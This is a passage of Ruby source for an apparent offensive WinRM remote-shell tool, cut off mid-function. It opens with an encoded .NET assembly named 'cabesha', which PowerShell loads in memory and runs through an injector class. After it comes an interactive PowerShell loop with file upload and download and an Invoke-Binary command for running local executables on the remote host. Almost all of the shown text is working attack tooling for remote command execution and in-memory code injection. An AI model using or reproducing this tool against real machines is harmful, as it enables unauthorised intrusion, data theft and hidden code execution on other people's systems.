sIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDg0LCAxMTQsIDk3LCAxMDAsIDEwMSwgMTA5LCA5NywgMTE0LCAxMDcsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDY3LCAxMTcsIDEwOCwgMTE2LCAxMTcsIDExNCwgMTAxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgODIsIDExNywgMTEwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDQ2LCA3MywgMTEwLCAxMTYsIDEwMSwgMTE0LCAxMTEsIDExMiwgODMsIDEwMSwgMTE0LCAxMTgsIDEwNSwgOTksIDEwMSwgMTE1LCAwLCA2NywgMTExLCAxMDksIDg2LCAxMDUsIDExNSwgMTA1LCA5OCwgMTA4LCAxMDEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDg2LCAxMDEsIDExNCwgMTE1LCAxMDUsIDExMSwgMTEwLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgNjgsIDEwNSwgOTcsIDEwMywgMTEwLCAxMTEsIDExNSwgMTE2LCAxMDUsIDk5LCAxMTUsIDAsIDY4LCAxMDEsIDk4LCAxMTcsIDEwMywgMTAzLCA5NywgOTgsIDEwOCwgMTAxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjgsIDEwMSwgOTgsIDExNywgMTAzLCAxMDMsIDEwNSwgMTEwLCAxMDMsIDc3LCAxMTEsIDEwMCwgMTAxLCAxMTUsIDAsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNDYsIDgyLCAxMTcsIDExMCwgMTE2LCAxMDUsIDEwOSwgMTAxLCA0NiwgNjcsIDExMSwgMTA5LCAxMTIsIDEwNSwgMTA4LCAxMDEsIDExNCwgODMsIDEwMSwgMTE0LCAxMTgsIDEwNSwgOTksIDEwMSwgMTE1LCAwLCA2NywgMTExLCAxMDksIDExMiwgMTA1LCAxMDgsIDk3LCAxMTYsIDEwNSwgMTExLCAxMTAsIDgyLCAxMDEsIDEwOCwgOTcsIDEyMCwgOTcsIDExNiwgMTA1LCAxMTEsIDExMCwgMTE1LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgODIsIDExNywgMTEwLCAxMTYsIDEwNSwgMTA5LCAxMDEsIDY3LCAxMTEsIDEwOSwgMTEyLCA5NywgMTE2LCAxMDUsIDk4LCAxMDUsIDEwOCwgMTA1LCAxMTYsIDEyMSwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDk5LCA5NywgOTgsIDEwMSwgMTE1LCAxMDQsIDk3LCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCA3MywgNzksIDAsIDgzLCAxMTYsIDExNCwgMTA1LCAxMTAsIDEwMywgODcsIDExNCwgMTA1LCAxMTYsIDEwMSwgMTE0LCAwLCA2NywgMTExLCAxMTAsIDExNSwgMTExLCAxMDgsIDEwMSwgMCwgODQsIDEwMSwgMTIwLCAxMTYsIDg3LCAxMTQsIDEwNSwgMTE2LCAxMDEsIDExNCwgMCwgODMsIDEwMSwgMTE2LCA3OSwgMTE3LCAxMTYsIDAsIDgzLCAxMDEsIDExNiwgNjksIDExNCwgMTE0LCAxMTEsIDExNCwgMCwgODQsIDExMSwgODMsIDExNiwgMTE0LCAxMDUsIDExMCwgMTAzLCAwLCA2NywgMTExLCAxMTAsIDExOCwgMTAxLCAxMTQsIDExNiwgMCwgNzAsIDExNCwgMTExLCAxMDksIDY2LCA5NywgMTE1LCAxMDEsIDU0LCA1MiwgODMsIDExNiwgMTE0LCAxMDUsIDExMCwgMTAzLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDAsIDc2LCAxMTEsIDk3LCAxMDAsIDAsIDc3LCAxMDEsIDExNiwgMTA0LCAxMTEsIDEwMCwgNzMsIDExMCwgMTAyLCAxMTEsIDAsIDEwMywgMTAxLCAxMTYsIDk1LCA2OSwgMTEwLCAxMTYsIDExNCwgMTIxLCA4MCwgMTExLCAxMDUsIDExMCwgMTE2LCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCA2NywgMTExLCAxMTQsIDEwMSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgNzYsIDEwNSwgMTEwLCAxMTMsIDAsIDY5LCAxMTAsIDExNywgMTA5LCAxMDEsIDExNCwgOTcsIDk4LCAxMDgsIDEwMSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgNjcsIDExMSwgMTA4LCAxMDgsIDEwMSwgOTksIDExNiwgMTA1LCAxMTEsIDExMCwgMTE1LCA0NiwgNzEsIDEwMSwgMTEwLCAxMDEsIDExNCwgMTA1LCA5OSwgMCwgNzMsIDY5LCAxMTAsIDExNywgMTA5LCAxMDEsIDExNCwgOTcsIDk4LCAxMDgsIDEwMSwgOTYsIDQ5LCAwLCA4MywgMTA3LCAxMDUsIDExMiwgMCwgODQsIDExMSwgNjUsIDExNCwgMTE0LCA5NywgMTIxLCAwLCA3NywgMTAxLCAxMTYsIDEwNCwgMTExLCAxMDAsIDY2LCA5NywgMTE1LCAxMDEsIDAsIDczLCAxMTAsIDExOCwgMTExLCAxMDcsIDEwMSwgMCwgMCwgMCwgMCwgMCwgMywgMzIsIDAsIDAsIDAsIDAsIDAsIDM1LCAxODEsIDIwLCAyMzcsIDE3OCwgMjIsIDIwNSwgNzQsIDE0NSwgOTUsIDE3MSwgMzEsIDIyNCwgMjUxLCAyMjUsIDE2MywgMCwgOCwgMTgzLCAxMjIsIDkyLCA4NiwgMjUsIDUyLCAyMjQsIDEzNywgNSwgMCwgMSwgMTQsIDI5LCAxNCwgNCwgMzIsIDEsIDEsIDE0LCA0LCAzMiwgMSwgMSwgMiwgNSwgMzIsIDEsIDEsIDE3LCA1NywgNCwgMzIsIDEsIDEsIDgsIDMsIDMyLCAwLCAxLCA1LCAwLCAxLCAxLCAxOCwgNzcsIDMsIDMyLCAwLCAxNCwgNSwgMCwgMSwgMjksIDUsIDE0LCA2LCAwLCAxLCAxOCwgODUsIDI5LCA1LCA0LCAzMiwgMCwgMTgsIDg5LCAxNiwgMTYsIDEsIDIsIDIxLCAxOCwgOTcsIDEsIDMwLCAwLCAyMSwgMTgsIDk3LCAxLCAzMCwgMCwgOCwgMywgMTAsIDEsIDE0LCAxMiwgMTYsIDEsIDEsIDI5LCAzMCwgMCwgMjEsIDE4LCA5NywgMSwgMzAsIDAsIDYsIDMyLCAyLCAyOCwgMjgsIDI5LCAyOCwgMTUsIDcsIDgsIDE4LCA2OSwgMTQsIDI5LCA1LCAxOCwgODUsIDE4LCA4OSwgMTQsIDE0LCAyOSwgMjgsIDU1LCAxLCAwLCAyNiwgNDYsIDc4LCA2OSwgODQsIDcwLCAxMTQsIDk3LCAxMDksIDEwMSwgMTE5LCAxMTEsIDExNCwgMTA3LCA0NCwgODYsIDEwMSwgMTE0LCAxMTUsIDEwNSwgMTExLCAxMTAsIDYxLCAxMTgsIDUyLCA0NiwgNTMsIDEsIDAsIDg0LCAxNCwgMjAsIDcwLCAxMTQsIDk3LCAxMDksIDEwMSwgMTE5LCAxMTEsIDExNCwgMTA3LCA2OCwgMTA1LCAxMTUsIDExMiwgMTA4LCA5NywgMTIxLCA3OCwgOTcsIDEwOSwgMTAxLCAwLCAxMiwgMSwgMCwgNywgOTksIDk3LCA5OCwgMTAxLCAxMTUsIDEwNCwgOTcsIDAsIDAsIDUsIDEsIDAsIDAsIDAsIDAsIDE5LCAxLCAwLCAxNCwgNjcsIDExMSwgMTEyLCAxMjEsIDExNCwgMTA1LCAxMDMsIDEwNCwgMTE2LCAzMiwgNTAsIDQ4LCA0OSwgNTcsIDAsIDAsIDgsIDEsIDAsIDcsIDEsIDAsIDAsIDAsIDAsIDgsIDEsIDAsIDgsIDAsIDAsIDAsIDAsIDAsIDMwLCAxLCAwLCAxLCAwLCA4NCwgMiwgMjIsIDg3LCAxMTQsIDk3LCAxMTIsIDc4LCAxMTEsIDExMCwgNjksIDEyMCwgOTksIDEwMSwgMTEyLCAxMTYsIDEwNSwgMTExLCAxMTAsIDg0LCAxMDQsIDExNCwgMTExLCAxMTksIDExNSwgMSwgMCwgMCwgMCwgMCwgMCwgMCwgMjQ1LCAxODIsIDIzMSwgOTIsIDAsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDI4LCAxLCAwLCAwLCAyNDAsIDM5LCAwLCAwLCAyNDAsIDksIDAsIDAsIDgyLCA4MywgNjgsIDgzLCAxODEsIDE1LCAxNTksIDgsIDIxMSwgMjM1LCAxOTcsIDcyLCAxMzIsIDUzLCA4NywgMTE3LCAxOTUsIDU0LCAxNTMsIDE5NiwgMywgMCwgMCwgMCwgOTksIDU4LCA5MiwgODUsIDExNSwgMTAxLCAxMTQsIDExNSwgOTIsIDExMywgNTIsIDU2LCA1NywgNTAsIDUzLCA0OCwgNDksIDU2LCA5MiwgNjgsIDExMSwgOTksIDExNywgMTA5LCAxMDEsIDExMCwgMTE2LCAxMTUsIDkyLCA4MywgMTA0LCA5NywgMTE0LCAxMTIsIDY4LCAxMDEsIDExOCwgMTAxLCAxMDgsIDExMSwgMTEyLCAzMiwgODAsIDExNCwgMTExLCAxMDYsIDEwMSwgOTksIDExNiwgMTE1LCA5MiwgOTksIDk3LCA5OCwgMTAxLCAxMTUsIDEwNCwgOTcsIDkyLCA5OSwgOTcsIDk4LCAxMDEsIDExNSwgMTA0LCA5NywgOTIsIDExMSwgOTgsIDEwNiwgOTIsIDY4LCAxMDEsIDk4LCAxMTcsIDEwMywgOTIsIDk5LCA5NywgOTgsIDEwMSwgMTE1LCAxMDQsIDk3LCA0NiwgMTEyLCAxMDAsIDk4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA1MiwgNDEsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDc4LCA0MSwgMCwgMCwgMCwgMzIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY0LCA0MSwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgOTUsIDY3LCAxMTEsIDExNCwgNjgsIDEwOCwgMTA4LCA3NywgOTcsIDEwNSwgMTEwLCAwLCAxMDksIDExNSwgOTksIDExMSwgMTE0LCAxMDEsIDEwMSwgNDYsIDEwMCwgMTA4LCAxMDgsIDAsIDAsIDAsIDAsIDAsIDI1NSwgMzcsIDAsIDMyLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgMTYsIDAsIDAsIDAsIDI0LCAwLCAwLCAxMjgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDEsIDAsIDAsIDAsIDQ4LCAwLCAwLCAxMjgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDAsIDAsIDAsIDAsIDcyLCAwLCAwLCAwLCA4OCwgNjQsIDAsIDAsIDIwNCwgMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMjA0LCAyLCA1MiwgMCwgMCwgMCwgODYsIDAsIDgzLCAwLCA5NSwgMCwgODYsIDAsIDY5LCAwLCA4MiwgMCwgODMsIDAsIDczLCAwLCA3OSwgMCwgNzgsIDAsIDk1LCAwLCA3MywgMCwgNzgsIDAsIDcwLCAwLCA3OSwgMCwgMCwgMCwgMCwgMCwgMTg5LCA0LCAyMzksIDI1NCwgMCwgMCwgMSwgMCwgMCwgMCwgMSwgMCwgMTMwLCA3MiwgMTcxLCAyNywgMCwgMCwgMSwgMCwgMTMwLCA3MiwgMTcxLCAyNywgNjMsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDQsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY4LCAwLCAwLCAwLCAxLCAwLCA4NiwgMCwgOTcsIDAsIDExNCwgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDczLCAwLCAxMTAsIDAsIDEwMiwgMCwgMTExLCAwLCAwLCAwLCAwLCAwLCAzNiwgMCwgNCwgMCwgMCwgMCwgODQsIDAsIDExNCwgMCwgOTcsIDAsIDExMCwgMCwgMTE1LCAwLCAxMDgsIDAsIDk3LCAwLCAxMTYsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDE3NiwgNCwgNDQsIDIsIDAsIDAsIDEsIDAsIDgzLCAwLCAxMTYsIDAsIDExNCwgMCwgMTA1LCAwLCAxMTAsIDAsIDEwMywgMCwgNzAsIDAsIDEwNSwgMCwgMTA4LCAwLCAxMDEsIDAsIDczLCAwLCAxMTAsIDAsIDEwMiwgMCwgMTExLCAwLCAwLCAwLCA4LCAyLCAwLCAwLCAxLCAwLCA0OCwgMCwgNDgsIDAsIDQ4LCAwLCA0OCwgMCwgNDgsIDAsIDUyLCAwLCA5OCwgMCwgNDgsIDAsIDAsIDAsIDU2LCAwLCA4LCAwLCAxLCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgNjgsIDAsIDEwMSwgMCwgMTE1LCAwLCA5OSwgMCwgMTE0LCAwLCAxMDUsIDAsIDExMiwgMCwgMTE2LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCAwLCAwLCA5OSwgMCwgOTcsIDAsIDk4LCAwLCAxMDEsIDAsIDExNSwgMCwgMTA0LCAwLCA5NywgMCwgMCwgMCwgNjQsIDAsIDE1LCAwLCAxLCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgODYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTUsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDAsIDAsIDQ5LCAwLCA0NiwgMCwgNDgsIDAsIDQ2LCAwLCA1NSwgMCwgNDgsIDAsIDU2LCAwLCA1MSwgMCwgNDYsIDAsIDQ5LCAwLCA1NiwgMCwgNTMsIDAsIDU0LCAwLCA1MCwgMCwgMCwgMCwgMCwgMCwgNTYsIDAsIDEyLCAwLCAxLCAwLCA3MywgMCwgMTEwLCAwLCAxMTYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTAsIDAsIDk3LCAwLCAxMDgsIDAsIDc4LCAwLCA5NywgMCwgMTA5LCAwLCAxMDEsIDAsIDAsIDAsIDk5LCAwLCA5NywgMCwgOTgsIDAsIDEwMSwgMCwgMTE1LCAwLCAxMDQsIDAsIDk3LCAwLCA0NiwgMCwgMTAwLCAwLCAxMDgsIDAsIDEwOCwgMCwgMCwgMCwgNjgsIDAsIDE1LCAwLCAxLCAwLCA3NiwgMCwgMTAxLCAwLCAxMDMsIDAsIDk3LCAwLCAxMDgsIDAsIDY3LCAwLCAxMTEsIDAsIDExMiwgMCwgMTIxLCAwLCAxMTQsIDAsIDEwNSwgMCwgMTAzLCAwLCAxMDQsIDAsIDExNiwgMCwgMCwgMCwgNjcsIDAsIDExMSwgMCwgMTEyLCAwLCAxMjEsIDAsIDExNCwgMCwgMTA1LCAwLCAxMDMsIDAsIDEwNCwgMCwgMTE2LCAwLCAzMiwgMCwgNTAsIDAsIDQ4LCAwLCA0OSwgMCwgNTcsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAxMiwgMCwgMSwgMCwgNzksIDAsIDExNCwgMCwgMTA1LCAwLCAxMDMsIDAsIDEwNSwgMCwgMTEwLCAwLCA5NywgMCwgMTA4LCAwLCA3MCwgMCwgMTA1LCAwLCAxMDgsIDAsIDEwMSwgMCwgMTEwLCAwLCA5NywgMCwgMTA5LCAwLCAxMDEsIDAsIDAsIDAsIDk5LCAwLCA5NywgMCwgOTgsIDAsIDEwMSwgMCwgMTE1LCAwLCAxMDQsIDAsIDk3LCAwLCA0NiwgMCwgMTAwLCAwLCAxMDgsIDAsIDEwOCwgMCwgMCwgMCwgNDgsIDAsIDgsIDAsIDEsIDAsIDgwLCAwLCAxMTQsIDAsIDExMSwgMCwgMTAwLCAwLCAxMTcsIDAsIDk5LCAwLCAxMTYsIDAsIDc4LCAwLCA5NywgMCwgMTA5LCAwLCAxMDEsIDAsIDAsIDAsIDAsIDAsIDk5LCAwLCA5NywgMCwgOTgsIDAsIDEwMSwgMCwgMTE1LCAwLCAxMDQsIDAsIDk3LCAwLCAwLCAwLCA2OCwgMCwgMTUsIDAsIDEsIDAsIDgwLCAwLCAxMTQsIDAsIDExMSwgMCwgMTAwLCAwLCAxMTcsIDAsIDk5LCAwLCAxMTYsIDAsIDg2LCAwLCAxMDEsIDAsIDExNCwgMCwgMTE1LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCA0OSwgMCwgNDYsIDAsIDQ4LCAwLCA0NiwgMCwgNTUsIDAsIDQ4LCAwLCA1NiwgMCwgNTEsIDAsIDQ2LCAwLCA0OSwgMCwgNTYsIDAsIDUzLCAwLCA1NCwgMCwgNTAsIDAsIDAsIDAsIDAsIDAsIDcyLCAwLCAxNSwgMCwgMSwgMCwgNjUsIDAsIDExNSwgMCwgMTE1LCAwLCAxMDEsIDAsIDEwOSwgMCwgOTgsIDAsIDEwOCwgMCwgMTIxLCAwLCAzMiwgMCwgODYsIDAsIDEwMSwgMCwgMTE0LCAwLCAxMTUsIDAsIDEwNSwgMCwgMTExLCAwLCAxMTAsIDAsIDAsIDAsIDQ5LCAwLCA0NiwgMCwgNDgsIDAsIDQ2LCAwLCA1NSwgMCwgNDgsIDAsIDU2LCAwLCA1MSwgMCwgNDYsIDAsIDQ5LCAwLCA1NiwgMCwgNTMsIDAsIDU0LCAwLCA1MCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMzIsIDAsIDAsIDEyLCAwLCAwLCAwLCA5NiwgNTcsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDApKSB8IG91dC1udWxsIApbQ2FiZXNoYS5JbmplY3Rvcl06OkV4ZWN1dGUoJGFyZ3VtZW50b3MpCn0=")

class String def tokenize
    self.
        split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
        select {|s| not s.empty? }.
        map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
    end
end

LIST = ['upload', 'download', 'exit', 'menu', 'services'].sort

silent_warnings do
    LIST = LIST + functions
end

completion = 
    proc do |str|
      case
      when Readline.line_buffer =~ /help.*/i
        puts("#{LIST.join("\t")}")
      when Readline.line_buffer =~ /Invoke-Binary.*/i
        executables.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
      when Readline.line_buffer =~ /upload.*/i
        paths = paths(str)
        paths.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
      else 
        LIST.grep( /^#{Regexp.escape(str)}/i ) unless str.nil?
      end
    end

Readline.completion_proc = completion       
Readline.completion_append_character = '' 

command = ""

begin
    print_message("Establishing connection to remote endpoint", TYPE_INFO)
    conn.shell(:powershell) do |shell|
        until command == "exit" do

            pwd = shell.run("(get-location).path").output.strip
            command = Readline.readline("PS "+pwd+"> ", true) #true for command history

            if command.start_with?('upload') then
                upload_command = command.tokenize
                command = ""

                # If the file to upload exists in current dir, is not needed to set upload name, otherwise must be done
                if upload_command[2].to_s.empty? then upload_command[2] = "." end
                begin
                    print_message("Uploading " + upload_command[1] + " to " + upload_command[2], TYPE_INFO)
                    file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes|
                    print_message("#{bytes_copied} bytes of #{total_bytes} bytes copied", TYPE_DATA)
                    print_message("Upload successful!", TYPE_INFO)
                  end
                rescue
                    print_message("Upload failed. Check file names", TYPE_ERROR)
                end

            elsif command.start_with?('download') then
                download_command = command.tokenize
                command = ""

                # If the file to download exists in current dir, is not needed to set download name, otherwise must be done
                if download_command[2].to_s.empty? then download_command[2] = download_command[1] end
                begin
                    print_message("Downloading " + download_command[1] + " to " + download_command[2], TYPE_INFO)
                    file_manager.download(download_command[1], download_command[2])
                    print_message("Download successful!", TYPE_INFO)
                rescue
                    print_message("Download failed. Check file names", TYPE_ERROR)
                end

            elsif command.start_with?('Invoke-Binary') then
                begin
                    invoke_Binary = command.tokenize
                    command = ""
                    load_executable = invoke_Binary[1]
                    load_executable = File.binread(load_executable)
